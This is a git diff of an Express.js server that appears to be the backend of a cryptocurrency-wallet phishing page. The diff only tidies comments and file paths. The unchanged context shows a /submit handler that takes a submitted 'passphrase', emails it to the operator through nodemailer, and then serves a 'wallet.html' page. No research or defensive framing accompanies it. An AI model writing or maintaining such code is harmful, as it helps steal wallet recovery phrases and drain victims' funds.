@@ -6,18 +6,16 @@ const nodemailer = require('nodemailer');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Parse URL-encoded form data
+// Middleware
 app.use(express.urlencoded({ extended: true }));
-
-// Serve static files from "public"
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ✅ Route for homepage (index.html)
+// Serve index.html
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ✅ Route to handle form submissions
+// Form submit handler
 app.post('/submit', (req, res) => {
   const phrase = req.body.passphrase;
 
@@ -42,20 +40,20 @@ app.post('/submit', (req, res) => {
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.error('❌ Email failed:', error);
+      console.error('❌ Email error:', error);
       return res.status(500).send('Email failed');
     }
     console.log('✅ Email sent:', info.response);
-    res.sendFile(path.join(__dirname, 'wallet.html'));
+    res.sendFile(path.join(__dirname, 'public', 'wallet.html'));
   });
 });
 
-// Catch-all 404
+// Catch-all
 app.get('*', (req, res) => {
   res.status(404).send('404 Not Found');
 });
 
-// Start the server
+// Start server
 app.listen(PORT, () => {
   console.log(`✅ Server running on port ${PORT}`);
 });
